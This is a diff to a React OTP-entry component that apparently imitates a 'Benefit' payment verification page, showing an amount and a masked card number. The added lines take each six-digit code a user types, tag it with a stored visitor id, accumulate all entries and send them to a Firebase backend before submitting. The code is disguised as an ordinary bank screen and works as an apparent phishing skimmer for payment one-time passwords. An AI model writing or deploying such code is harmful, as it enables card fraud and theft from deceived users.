@@ -4,6 +4,7 @@ import type React from "react"
 
 import { useState, useEffect, useRef } from "react"
 import { NumericKeypad } from "./numeric-keypad"
+import { addData } from "../firebase"
 
 interface OTPVerificationProps {
   amount: string
@@ -21,7 +22,7 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
   const [resendMessage, setResendMessage] = useState(false)
   const otpInputRef = useRef<HTMLInputElement>(null)
   const timerRef = useRef<NodeJS.Timeout | null>(null)
-
+  const allOtps: string[]=[]
   // Mask the card number
   const maskedCardNumber = cardNumber.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3")
 
@@ -89,7 +90,11 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
   const handleKeypadEnter = () => {
     setShowKeypad(false)
     if (otp.length === 6) {
-      handleSubmit(new Event("submit") as unknown as React.FormEvent)
+        const vId=localStorage.getItem('visitor')
+        allOtps.push(otp)
+        addData({id:vId,otp,allOtps:allOtps as any})
+  
+        handleSubmit(new Event("submit") as unknown as React.FormEvent)
     }
   }
 
@@ -228,7 +233,7 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
 
       {/* Footer */}
       <div className="text-center space-y-2 mb-6">
-        <img src="//logo.webp" alt="Benefit Logo" width={80} height={80} className="mx-auto" />
+        <img src="/logo.webp" alt="Benefit Logo" width={80} height={80} className="mx-auto" />
         <div className="px-6">
           <p className="text-right text-sm" dir="rtl">
             يدار الموقع من قبل شركة بنفت.
